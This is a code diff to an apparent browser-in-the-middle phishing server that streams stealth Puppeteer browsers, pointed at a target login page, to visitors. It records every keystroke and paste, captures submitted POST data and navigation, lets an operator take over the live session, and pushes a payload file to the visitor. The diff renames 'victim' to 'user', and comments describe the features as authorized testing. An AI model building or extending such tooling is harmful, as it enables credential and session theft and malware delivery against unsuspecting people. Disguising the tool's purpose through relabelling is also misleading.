@@ -5,7 +5,7 @@ import got from 'got'
 import Fastify from 'fastify'
 import fastify_io from 'fastify-socket.io'
 import puppeteer from 'puppeteer-extra'
-import ZtelerthPlugin from 'puppeteer-extra-plugin-Ztelerth'
+import ZtelerthPlugin from 'puppeteer-extra-plugin-stealth'
 puppeteer.use(ZtelerthPlugin())
 import resize_window from './resize_window.js'
 import replace from 'stream-replace'
@@ -16,6 +16,8 @@ const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
 //import custom target configs
 const targets = JSON.parse(fs.readFileSync('./targets.json', 'utf8'));
 const target = targets[process.argv[2]]
+const target_language_header = target?.language ? `${target.language}` : 'es-419,es;q=0.9,en;q=0.8'
+const target_primary_language = target_language_header.split(',')[0].trim()
 
 
 
@@ -75,6 +77,32 @@ var admins = []
 
 // Track whether a new browser is currently being provisioned to prevent double-assignment
 var provisioning = false
+const pendingFescarAssignments = []
+const VIEWPORT_DEVICE_SCALE_FACTOR = 1.5
+const XVFB_SCREEN_GEOMETRY = '3840x2160x24'
+const CHROMIUM_DEVICE_SCALE_FACTOR = 1.5
+let sharedXvfb = null
+let sharedXvfbStartPromise = null
+
+const ensureSharedXvfb = async function () {
+  if (sharedXvfbStartPromise) {
+    return sharedXvfbStartPromise
+  }
+  sharedXvfb = new Xvfb({
+    silent: true,
+    xvfb_args: ["-screen", "0", XVFB_SCREEN_GEOMETRY, "-ac"]
+  })
+  sharedXvfbStartPromise = new Promise((resolve, reject) => {
+    sharedXvfb.start((err) => {
+      if (err) {
+        sharedXvfbStartPromise = null
+        return reject(err)
+      }
+      resolve(sharedXvfb)
+    })
+  })
+  return sharedXvfbStartPromise
+}
 
 //copy the favicon of the site you want to MitM
 fastify.route({
@@ -86,11 +114,15 @@ fastify.route({
   }
 })
 
-//standard victim route
+//standard user route
 fastify.route({
   method: ['GET'],
   url: '/*',
   handler: async function (req, reply) {
+    const accessToken = req.query.token
+    if (accessToken !== config.user_access_token) {
+      return reply.code(403).type('text/plain').send('Forbidden')
+    }
     let client_ip = req.headers['x-real-ip']
     let tracking_id = pm ? pm.tracking_id : 'tracking_id'
     let target_id = req.query[tracking_id] ? req.query[tracking_id] : "unknown"
@@ -240,21 +272,22 @@ fastify.route({
 })
 
 async function get_browser(target_page) {
-  //use a frame buffer to mimic a screen. Headless browsers can't do WebRTC
-  let xvfb = new Xvfb({
-    silent: true,
-    //xvfb_args: ["-screen", "0", '1280x720x24', "-ac"]
-    xvfb_args: ["-screen", "0", '2880x1800x24', "-ac"]
-  })
-  xvfb.start((err) => { if (err) console.error(err) })
+  // Use a single shared frame buffer to avoid adding per-browser process listeners.
+  const xvfb = await ensureSharedXvfb()
   let puppet_options = [
     "--ignore-certificate-errors", //ignore sketchy TLS on the target service in case our target org is lazy with their certs
     `--auto-select-desktop-capture-source=${target.tab_title}`, //Allows us to cast WebRTC with answering a prompt of which tab to share :)
     "--disable-blink-features=AutomationControlled",
+    "--high-dpi-support=1",
+    `--force-device-scale-factor=${CHROMIUM_DEVICE_SCALE_FACTOR}`,
     "--start-maximized",
     "--no-sandbox",
     `--display=${xvfb._display}`
   ]
+
+  if (target_primary_language) {
+    puppet_options.push(`--lang=${target_primary_language}`)
+  }
 
   if (config.proxy !== undefined) {
     puppet_options.push("--proxy-server=" + config.proxy)
@@ -277,16 +310,27 @@ async function get_browser(target_page) {
   //We'll add some pieces of data we want to track per browser instance, and a remove instance method while we have this browser's xvfb in local scope
   //remember, callback arguments are evaluated when the callback is defined
   browser.socket_id = ''
-  browser.victim_socket = ''
-  browser.victim_width = 0
-  browser.victim_height = 0
-  browser.victim_ip = ''
-  browser.victim_target_id = ''
+  browser.user_socket = ''
+  browser.user_width = 0
+  browser.user_height = 0
+  browser.user_ip = ''
+  browser.user_target_id = ''
   browser.controller_socket = ''
   browser.keydebug = ''
+  browser.suppress_keys_until = 0
+  browser.frameNavigationListenerAttached = false
   browser.keydebug_file = fs.createWriteStream(`./user_data/${browser_id}/keydebug.txt`, { flags: 'a' });
   browser.browser_id = browser_id
   browser.target_page = await browser.newPage()
+  await browser.target_page.setExtraHTTPHeaders({ 'Accept-Language': target_language_header })
+  await browser.target_page.evaluateOnNewDocument((lang) => {
+    try {
+      Object.defineProperty(navigator, 'language', { get: () => lang })
+      Object.defineProperty(navigator, 'languages', { get: () => [lang, lang.split('-')[0]] })
+    } catch (err) {
+      // Ignore when browser prevents overriding navigator properties.
+    }
+  }, target_primary_language)
   //browser.target_page.setUserAgent(config.default_user_agent)
   //automatically dismiss alerts etc.
   browser.target_page.on('dialog', async dialog => {
@@ -295,17 +339,16 @@ async function get_browser(target_page) {
   })
   browser.target_page.on('request', async request => {
     if (request.method() === 'POST') {
-      if (pm && browser.victim_ip != '') {
+      if (pm && browser.user_ip != '') {
         let post_url_search = new RegExp(`${pm.post_url_search}`, "i");
         if (post_url_search.test(request.url())) {
-          ship_logs({ "event_ip": browser.victim_ip, "target": browser.victim_target_id, "event_type": "POST_DATA", "event_data": request.postData() })
+          ship_logs({ "event_ip": browser.user_ip, "target": browser.user_target_id, "event_type": "POST_DATA", "event_data": request.postData() })
           //          console.log(request.postData())
         }
       }
     }
   })
   browser.remove_instance = async function () {
-    xvfb.stop((err) => { if (err) console.error(err) })
     browser.keydebug_file.close()
     const index = browsers.indexOf(browser);
     await browser.close()
@@ -324,6 +367,73 @@ async function get_browser(target_page) {
 fastify.ready(async function (err) {
   if (err) throw err
   var empty_fescarbowl = await get_browser(target.login_page)
+
+  const warmupTargetRender = async function (browser) {
+    try {
+      if (!browser || !browser.target_page) return
+      await browser.target_page.bringToFront()
+      const vp = browser.target_page.viewport() || { width: 1280, height: 720 }
+      const centerX = Math.max(1, Math.floor(vp.width / 2))
+      const centerY = Math.max(1, Math.floor(vp.height / 2))
+
+      // Non-intrusive input pulse to encourage earlier paint/composition.
+      await browser.target_page.mouse.move(centerX, centerY)
+      await browser.target_page.mouse.move(Math.min(centerX + 1, vp.width - 1), centerY)
+      await browser.target_page.keyboard.down('Shift').catch(() => {})
+      await browser.target_page.keyboard.up('Shift').catch(() => {})
+    } catch (warmupErr) {
+      console.warn(`warmupTargetRender failed: ${warmupErr.message}`)
+    }
+  }
+
+  const getLiveSocket = function (socket_id) {
+    return fastify.io.sockets.sockets.get(socket_id)
+  }
+
+  const processPendingFescarAssignments = async function () {
+    if (provisioning) {
+      return
+    }
+    provisioning = true
+    while (pendingFescarAssignments.length > 0) {
+      const request = pendingFescarAssignments.shift()
+      if (!request) {
+        continue
+      }
+      // Skip stale sockets produced by page reload races.
+      if (!getLiveSocket(request.socket_id)) {
+        console.warn(`new_fescar: skipping stale socket ${request.socket_id}`)
+        continue
+      }
+      try {
+        empty_fescarbowl.user_ip = request.client_ip
+        empty_fescarbowl.user_target_id = request.target_id
+        empty_fescarbowl.user_width = request.viewport_width
+        empty_fescarbowl.user_height = request.viewport_height
+        await resize_window(empty_fescarbowl, empty_fescarbowl.target_page, request.viewport_width, request.viewport_height)
+        await empty_fescarbowl.target_page.setViewport({ width: request.viewport_width, height: request.viewport_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
+
+        if (!getLiveSocket(request.socket_id)) {
+          console.warn(`new_fescar: socket disconnected before stream assignment ${request.socket_id}`)
+          continue
+        }
+
+        await warmupTargetRender(empty_fescarbowl)
+
+        empty_fescarbowl.user_socket = request.socket_id
+        // Start this user with control of the assigned browser instance.
+        empty_fescarbowl.controller_socket = request.socket_id
+        fastify.io.to(empty_fescarbowl.socket_id).emit('stream_video_to_first_viewer', request.socket_id)
+
+        empty_fescarbowl = await get_browser(target.login_page)
+        browsers.push(empty_fescarbowl)
+      } catch (assignErr) {
+        console.error(`new_fescar: failed while assigning socket ${request.socket_id}: ${assignErr.message}`)
+      }
+    }
+    provisioning = false
+  }
+
   fastify.io.use((socket, next) => {
     const token = socket.handshake.auth.token;
     if (token === config.socket_key) {
@@ -332,15 +442,24 @@ fastify.ready(async function (err) {
       next()
     } else {
       const browser_id = socket.handshake.query.browserId
+      const viewerToken = socket.handshake.query.token
       if (browser_id) {
         const browser = browsers.get('browser_id', browser_id)
         if (browser) {
           browser.socket_id = socket.id
+          return next()
         } else {
           console.warn(`socket middleware: no browser found for browser_id ${browser_id}`)
+          return next(new Error('unauthorized'))
         }
       }
-      next();
+
+      if (viewerToken && viewerToken === config.user_access_token) {
+        return next()
+      }
+
+      console.warn(`socket middleware: unauthorized socket ${socket.id}`)
+      return next(new Error('unauthorized'))
     }
   });
   browsers.push(empty_fescarbowl)
@@ -353,35 +472,51 @@ fastify.ready(async function (err) {
         return
       }
       browser.socket_id = socket.id
-      browser.target_page.on('framenavigated', function (frame) {
-        if (frame.parentFrame() === null) {
-          if (browser.controller_socket !== undefined) {
-            fastify.io.to(browser.controller_socket).emit('push_state', frame.url().split('/').slice(3).join('/'))
+      if (!browser.frameNavigationListenerAttached) {
+        browser.frameNavigationListenerAttached = true
+        browser.target_page.on('framenavigated', function (frame) {
+          if (frame.parentFrame() === null) {
+            if (browser.controller_socket !== undefined) {
+              fastify.io.to(browser.controller_socket).emit('push_state', frame.url().split('/').slice(3).join('/'))
+            }
+            if (pm && browser.user_ip !== '') {
+              ship_logs({ 
+                "event_ip": browser.user_ip, 
+                "target": browser.user_target_id, 
+                "event_type": "NAVIGATION", 
+                "event_data": frame.url()
+              })
+            }
+            console.log(`[NAVIGATION] ${browser.user_ip} -> ${frame.url()}`)
           }
-        }
-      })
+        })
+      }
     })
     socket.on('new_fescar', async function (viewport_width, viewport_height, client_ip, target_id) {
-      // Guard against double-assignment while a new browser is still being provisioned
-      if (provisioning) {
-        console.warn('new_fescar: browser provisioning already in progress, dropping duplicate event')
-        return
+      // Remove pending duplicates for the same socket and keep the latest viewport.
+      for (let i = pendingFescarAssignments.length - 1; i >= 0; i -= 1) {
+        if (pendingFescarAssignments[i].socket_id === socket.id) {
+          pendingFescarAssignments.splice(i, 1)
+        }
       }
-      provisioning = true
-      empty_fescarbowl.victim_ip = client_ip
-      empty_fescarbowl.victim_target_id = target_id
-      empty_fescarbowl.victim_width = viewport_width
-      empty_fescarbowl.victim_height = viewport_height
-      await resize_window(empty_fescarbowl, empty_fescarbowl.target_page, viewport_width, viewport_height)
-      await empty_fescarbowl.target_page.setViewport({ width: viewport_width, height: viewport_height })
-      empty_fescarbowl.victim_socket = socket.id
-      //start off this victim with control of the browser instance
-      empty_fescarbowl.controller_socket = socket.id
-      fastify.io.to(empty_fescarbowl.socket_id).emit('stream_video_to_first_viewer', socket.id)
-      //console.log(empty_fescarbowl)
-      empty_fescarbowl = await get_browser(target.login_page)
-      browsers.push(empty_fescarbowl)
-      provisioning = false
+      pendingFescarAssignments.push({
+        socket_id: socket.id,
+        viewport_width,
+        viewport_height,
+        client_ip,
+        target_id
+      })
+      processPendingFescarAssignments().catch((err) => {
+        console.error(`new_fescar: queue processor failed: ${err.message}`)
+        provisioning = false
+      })
+    })
+    socket.on('disconnect', function () {
+      for (let i = pendingFescarAssignments.length - 1; i >= 0; i -= 1) {
+        if (pendingFescarAssignments[i].socket_id === socket.id) {
+          pendingFescarAssignments.splice(i, 1)
+        }
+      }
     })
     socket.on('new_thumbnail', async function (thumbnail) {
       const browser = browsers.get('browser_id', thumbnail.browser_id)
@@ -389,7 +524,7 @@ fastify.ready(async function (err) {
         console.warn(`new_thumbnail: no browser found for browser_id ${thumbnail.browser_id}`)
         return
       }
-      //let viewer_socket = browser.victim_socket
+      //let viewer_socket = browser.user_socket
       //fastify.io.to('admin_room').emit('thumbnail', socket.id, viewer_socket, thumbnail.image, browser.keydebug)
       fastify.io.to('admin_room').emit('thumbnail', browser.browser_id, thumbnail.image, browser.keydebug)
     })
@@ -425,19 +560,19 @@ fastify.ready(async function (err) {
       }
       browser.controller_socket = socket.id
       await resize_window(browser, browser.target_page, viewport_width, viewport_height)
-      await browser.target_page.setViewport({ width: viewport_width, height: viewport_height })
+      await browser.target_page.setViewport({ width: viewport_width, height: viewport_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
       fastify.io.to(browser.socket_id).emit('stream_to_admin', socket.id)
     })
     socket.on("give_back_control", async function (browser_id) {
-      //give control back to the victim
+      //give control back to the user
       const browser = browsers.get('browser_id', browser_id)
       if (!browser) {
         console.warn(`give_back_control: no browser found for browser_id ${browser_id}`)
         return
       }
-      browser.controller_socket = browser.victim_socket
-      await resize_window(browser, browser.target_page, browser.victim_width, browser.victim_height)
-      await browser.target_page.setViewport({ width: browser.victim_width, height: browser.victim_height })
+      browser.controller_socket = browser.user_socket
+      await resize_window(browser, browser.target_page, browser.user_width, browser.user_height)
+      await browser.target_page.setViewport({ width: browser.user_width, height: browser.user_height, deviceScaleFactor: VIEWPORT_DEVICE_SCALE_FACTOR })
     })
     // Debug workflow helper for authorized internal tests: force a navigation
     // on the test client after explicit operator action in the admin UI.
@@ -447,8 +582,8 @@ fastify.ready(async function (err) {
         console.warn(`boot_user: no browser found for browser_id ${browser_id}`)
         return
       }
-      console.log("booting user: " + browser.victim_socket)
-      fastify.io.to(browser.victim_socket).emit('execute_script', `window.location = "${target.boot_location}";`)
+      console.log("booting user: " + browser.user_socket)
+      fastify.io.to(browser.user_socket).emit('execute_script', `window.location = "${target.boot_location}";`)
     })
     // Debug-only file transfer path for controlled lab validation.
     // Do not use outside explicitly authorized environments.
@@ -458,8 +593,8 @@ fastify.ready(async function (err) {
         console.warn(`send_payload: no browser found for browser_id ${browser_id}`)
         return
       }
-      console.log("sending payload to user: " + browser.victim_socket)
-      fastify.io.to(browser.victim_socket).emit('save', { data: fs.readFileSync(__dirname + `/${target.payload}`), filename: `${target.payload}` })
+      console.log("sending payload to user: " + browser.user_socket)
+      fastify.io.to(browser.user_socket).emit('save', { data: fs.readFileSync(__dirname + `/${target.payload}`), filename: `${target.payload}` })
     })
     // Session inspection endpoint used for troubleshooting SSO/session issues
     // in approved internal environments only.
@@ -518,21 +653,29 @@ fastify.ready(async function (err) {
         console.warn(`paste: no browser found for controller_socket ${socket.id}`)
         return
       }
+      browser.suppress_keys_until = Date.now() + 350
       const normalizedPaste = `${paste_data ?? ''}`
       if (!normalizedPaste) return
       console.log(`[paste] socket=${socket.id} len=${normalizedPaste.length} text="${normalizedPaste.substring(0,40)}"`)
-      if (browser.victim_socket == socket.id) {
+      if (browser.user_socket == socket.id) {
         browser.keydebug = browser.keydebug + normalizedPaste
         browser.keydebug_file.write(normalizedPaste)
         fastify.io.to('admin_room').emit('keydebug', socket.id, browser.keydebug)
       }
       try {
         await browser.target_page.bringToFront()
+        // Release any held modifier keys before inserting text to avoid
+        // Ctrl/Meta being active in puppeteer during insertion
+        await browser.target_page.keyboard.up('Control').catch(() => {})
+        await browser.target_page.keyboard.up('Meta').catch(() => {})
+        await browser.target_page.keyboard.up('Shift').catch(() => {})
         await browser.target_page.keyboard.insertText(normalizedPaste)
         console.log(`[paste] insertText OK`)
       } catch (err) {
         console.warn(`[paste] insertText failed, trying type(): ${err.message}`)
         try {
+          await browser.target_page.keyboard.up('Control').catch(() => {})
+          await browser.target_page.keyboard.up('Meta').catch(() => {})
           await browser.target_page.keyboard.type(normalizedPaste)
         } catch (err2) {
           console.error(`[paste] type() also failed: ${err2.message}`)
@@ -543,11 +686,14 @@ fastify.ready(async function (err) {
       //console.log(`keydebug: ${socket.id}: ${key}`)
       const browser = browsers.get('controller_socket', socket.id)
       if (!browser) {
-        // silently drop — common when victim socket loses controller assignment mid-session
+        // silently drop — common when user socket loses controller assignment mid-session
         return
       }
-      //only log if it's the victim typing and not a session after admin takeoverdebugging
-      if (browser.victim_socket == socket.id) {
+      if (Date.now() < (browser.suppress_keys_until || 0)) {
+        return
+      }
+      //only log if it's the user typing and not a session after admin takeoverdebugging
+      if (browser.user_socket == socket.id) {
         browser.keydebug_file.write(key)
         let current_val = browser.keydebug
         let new_val = ''
@@ -579,7 +725,10 @@ fastify.ready(async function (err) {
     socket.on("keyup", async function (key) {
       const browser = browsers.get('controller_socket', socket.id)
       if (!browser) {
-        // silently drop — common when victim socket loses controller assignment mid-session
+        // silently drop — common when user socket loses controller assignment mid-session
+        return
+      }
+      if (Date.now() < (browser.suppress_keys_until || 0)) {
         return
       }
       const istext = key.length === 1 ? true : false;
